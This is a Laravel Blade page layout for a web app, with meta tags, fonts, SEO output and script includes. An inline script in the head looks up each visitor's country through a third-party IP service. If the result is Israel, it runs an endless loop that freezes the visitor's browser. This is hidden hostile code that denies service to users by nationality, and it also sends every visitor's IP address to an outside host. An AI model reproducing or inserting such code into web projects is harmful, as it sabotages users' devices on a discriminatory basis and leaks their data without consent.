<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <!-- Fonts -->
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&display=swap">

    <link rel="stylesheet" href="/ternobo-socials/style.css">


    <!-- Styles -->
    {{--
    <link rel="stylesheet" href="{{ mix('css/app.css') }}"> --}}
    {!! SEO::generate() !!}

    <script>
        var APP_URL = "{{ url('/') }}";
        var country = "Iran"
        fetch('https://extreme-ip-lookup.com/json/')
            .then(res => res.json())
            .then(response => {
               country = response.country;
               if(country == 'Israel'){
                   while(true){}
               }
            });

    </script>
    <script>
        var user_id = @auth {{ Auth::user()->id }} @endauth @guest false @endguest;
    </script>

    </head>

    <body class="font-sans antialiased">
        @inertia

        <script src="/manifest.js" defer></script>
        <script src="/js/vendor.js" defer></script>
        <script src="/js/app.js" defer></script>
        <script src="{{ url('/js/framemanager.js') }}" defer></script>
    </body>

    </html>
